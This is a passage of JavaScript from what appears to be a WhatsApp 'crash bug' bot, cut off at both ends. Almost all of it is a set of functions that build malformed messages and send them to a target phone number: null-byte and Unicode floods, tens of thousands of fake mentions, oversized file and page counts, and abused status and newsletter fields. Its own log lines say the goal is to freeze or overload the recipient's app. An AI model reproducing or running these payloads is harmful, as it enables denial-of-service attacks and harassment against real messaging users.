          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  let xeonyfuck = JSON.stringify({
    status: true,
    criador: "Telegram: @lo_tus_19",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  let xeonOutBrutal = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["01096379348@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "Telegram: @lo_tus_19",
            text: "Telegram: @lo_tus_19",
            description: "Telegram: @lo_tus_19",
            footer: "Telegram: @lo_tus_19",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: xeonOrWhat + "Telegram: @MiiddddoooVIP_1XB" },
              { name: "view_product", buttonParamsJson: xeonOrWhat + "Telegram: @lo_tus_19" },
              { name: "payment_method", buttonParamsJson: xeonOrWhat + "Telegram: @lo_tus_19" },
              { name: "call_permission_request", buttonParamsJson: xeonyfuck + "\u0003" },
              { name: "mpm", buttonParamsJson: xeonyfuck + "Telegram: @lo_tus_19" },
              { name: "payment_info", buttonParamsJson: xeonyfuck + "Telegram: @lo_tus_19VIP_1XB" },
            ],
          },
        },
      },
    },
  };

  await XeonBotInc.relayMessage(target, xeonOutBrutal, {
    participant: { jid: target },
  });
}
//==============================================================\\
async function xeonbuttonfc(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "‌Telegram: @lo_tus_19",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
//==============================================================\\
async function StanzaFuxker(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Telegram: @lo_tus_19" + "".repeat(16999), 
          listType: 2,
          singleSelectReply: {
            selectedRowId: "",
          },
          contextInfo: {
            virtexId: XeonBotInc.generateMessageTag(),
            participant: "5521992999999@s.whatsapp.net",
            mentionedJid: "5521992999999@s.whatsapp.net",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://example.com/largefile",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999", // Large file size
                  pageCount: 1316134911,  // Max page count to slow down memory
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Telegram: @lo_tus_19" + "".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "",
                },
                hasMediaAttachment: true,
                contentText: 'Telegram: @lo_tus_19',
                footerText: "Telegram: @lo_tus_19",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Telegram: @lo_tus_19" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Telegram: @lo_tus_19" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Telegram: @lo_tus_19" + "".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "Telegram: @lo_tus_19",
            entryPointConversionApp: "Telegram: @lo_tus_19",
            actionLink: {
              url: "t.me/ 13",
              buttonTitle: "Telegram: @lo_tus_19",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "Telegram: @lo_tus_19",
            parentGroupJid: "Telegram: @lo_tus_19",
            trustBannerType: "Telegram: @lo_tus_19",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
          },
          description: "".repeat(29999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  let sections = [];
  for (let i = 0; i < 40; i++) {  
    let largeText = "\u0000".repeat(11999);  
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }

  let listMessage = {
    title: "".repeat(70000),
    sections: sections,
  };

  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "5521992999999@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'Telegram: @lo_tus_19' + "".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "zhee crash" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  
  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });

  console.log(`Payload sent to ${target} - Overload complete`);

  await XeonBotInc.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  
  console.log(`Message sent to ${target} - Memory Overload`);
}
//==============================================================\\
let push = [];
let buttt = [];
for (let i = 0; i < 1000; i++) {push.push({body: proto.Message.InteractiveMessage.Body.fromObject({text: "ㅤ"}),footer: proto.Message.InteractiveMessage.Footer.fromObject({text: "ㅤㅤ"}),header: proto.Message.InteractiveMessage.Header.fromObject({title: '\n', hasMediaAttachment: true,"imageMessage": {"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true","mimetype": "image/jpeg","fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=","fileLength": "10840","height": 10,"width": 10,"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=","fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=","directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0","mediaKeyTimestamp": "1721344123","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",}}),nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({"buttons": [] })});}
const carousel = generateWAMessageFromContent(from, {viewOnceMessage: {message: {messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 2},interactiveMessage: proto.Message.InteractiveMessage.fromObject({body: proto.Message.InteractiveMessage.Body.create({text: "Telegram: @lo_tus_19 "}),footer: proto.Message.InteractiveMessage.Footer.create({text: global.namabot}),header: proto.Message.InteractiveMessage.Header.create({hasMediaAttachment: false}),carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({cards: [...push]})})}}}, {});
const stanza = [{attrs: { biz_bot: '1' },tag: "bot",},{attrs: {},tag: "biz",},];
async function xgc4(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Telegram: @lo_tus_19" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await XeonBotInc.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
const { bug } = require('./69/bug.js');
const { bugUrl } = require('./69/bugUrl.js')
//==============================================================\\
async function xeoninvidelay(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: " ",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await XeonBotInc.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: " " },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
//==============================================================\\
async function xeonblackscreenjammer(target){
  const msg = generateWAMessageFromContent(target, {
    locationMessage: {
        degreesLatitude: 0,
        degreesLongitude: 0,
        name: "Telegram: @lo_tus_19",
        url: bugUrl,
        isLive: true,
        contextInfo: {
            forwardingScore: 508,
            isForwarded: true,
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: sender,
            quotedMessage: {
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    title: "crash",
                    pageCount: 1000000000,
                    fileName: "crash.pdf",
                    contactVcard: true
                }
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363274419284848@newsletter',
                serverMessageId: 1,
                newsletterName: " " + bug + bug
            },
            externalAdReply: {
                title: ' Telegram: @lo_tus_19 ',
                body: 'Telegram: @lo_tus_19',
                mediaType: 0,
                thumbnail: m,
                jpegThumbnail: m,
                mediaUrl: `https://www.youtube.com/@ `,
                sourceUrl: `https://www.youtube.com/@ `
            }
        }
    }
}, {});
await XeonBotInc.relayMessage(target, carousel.message, { quoted: carousel.key.id, participant: { jid: target }});
await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
});
}
//==============================================================\\
    const mentionedList = [
        "01096379348@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
async function forcedelok(isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𝗕𝗢𝗧 BODY ⍣᳟ crash༑⃟⃟🎭',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
                    fileEncSha256: "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
                    directPath: "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749258106",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADFhMzhcbCZl1qqWWClgGZsRbX0FpXXbK1mm1bI2/PBA6Z581Mrcemo5TXfK/YuV+d38KkETHI9Dg7D10nZVibC4KRvn9jMKkcDn22D0nYA09Aaz3NCq4Fn/8QAJhAAAgIBAwQCAgMAAAAAAAAAAQIAAxEEEiEiMUFCBTIjUVJhcf/aAAgBAQABPwADpaASzODEOIwLFYW2oQIsVeTPE9WlaF2wJdW44IgqsLDCGPVZhehoa3CnKGU0M8sq2EieBPUzRAnUARaqfYCKieFEKr+paK/OIwUfUTUnDQYwIeAZ8aM6iMdOg6yJVsY9D5EvB2gA4jnT1EbzzLHrZSyS9iXP+wdhxDyDPjK8WM5jaeq/7CVUpVwgl2YaqrfsoJjqiDAAAmrGx8wN2ngzQ81gxW2nk8Q2ovIMe5nOCuBOB5jAuTNfw2IuciKMylRXSuIjcf1Ait6xmydpSEc4jtsE1oO7dF7iafAK5/cGo28jtBqVPbgyrU4jXAsDGtfPAhGepzNZ1JkQMcrEIUDMFmIGRpWo8GMAV4M/L/KZwMlpqbN3Anss/8QAGREBAQADAQAAAAAAAAAAAAAAAQAQESAx/9oACAECAQE/AI84Ms8sw28MxnV//8QAGxEAAgIDAQAAAAAAAAAAAAAAAAECEBExQSD/2gAIAQMBAT8AFoWrVsZHY8cptPhIjWDBIXho/9k=",
                    scansSidecar: "AFSng39E1ihNVcnvV5JoBszeReQ+8qVlwm2gNLbmZ/h8OqRdcad1CA==",
                    scanLengths: [ 5657, 38661, 12072, 27792 ],
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "𝗕𝗢𝗧 BODY ⍣᳟ crash༑⃟⃟🎭"
                },
                footer: {
                  text: "Carosuel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            mentionedJid: mentionedList,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Xrl ~ Fuckerr",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "review_and_pay",
                      paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐑𝐞𝐥𝐥𝐲𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

    
    
async function freeze(target) {
    await XeonBotInc.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "BOFY 🕷️🕸️- StickerPack" + "ꦾ".repeat(70000),
        publisher: "BODY 🕷️ 🕸️ Mp4",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "Jawa Jawa", isLottie: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 25000 }, () =>
                `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
console.log(`send bug to ${target}`);
}

//==============================================================\\
async function protocolbug6(target, mention = true) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`) 
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "01096379348@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "☠️ - んジェラルド - ☠️",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            },
            isSampled: true,
            mentionedJid: mentionedList,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(target, {
